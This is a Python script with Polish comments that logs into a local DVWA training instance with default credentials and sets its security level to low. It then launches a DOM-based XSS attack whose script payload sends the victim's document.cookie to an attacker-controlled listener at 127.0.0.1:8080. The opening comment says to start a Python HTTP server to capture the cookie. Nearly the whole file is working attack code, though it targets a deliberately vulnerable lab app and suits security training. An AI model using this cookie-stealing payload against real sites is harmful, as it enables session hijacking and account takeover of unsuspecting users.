#Na poczatek nalezy uruchomic polecenie "sudo python3 -m http.server 8080", w celu przejecie cookie.
import requests
from bs4 import BeautifulSoup
import urllib.parse
import webbrowser

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
VULN_URL = "http://localhost/DVWA/vulnerabilities/xss_d/?default="
USERNAME = "admin"
PASSWORD = "password"

ATTACKER_SERVER = "http://127.0.0.1:8080"

session = requests.Session()

def login():
    print("[*] Logowanie do DVWA...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    print("[*] Ustawianie poziomu zabezpieczeń na LOW...")
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def perform_xss_attack():
    print("[*] Rozpoczynam atak DOM-Based XSS...")

    raw_payload = f"<script>window.location='{ATTACKER_SERVER}/?cookie='+document.cookie</script>"

    vuln_url = f"{VULN_URL}{raw_payload}"

    print("[*] Otwieranie przeglądarki z payloadem...")
    webbrowser.open(vuln_url)

    print("[*] Link do ręcznego testowania (jeśli potrzeba):")
    print(vuln_url)

    encoded_payload = urllib.parse.quote(raw_payload)
    debug_url = f"{VULN_URL}{encoded_payload}"
    print("[*] Debug (zakodowany URL):", debug_url)

if __name__ == "__main__":
    login()
    set_security_low()
    perform_xss_attack()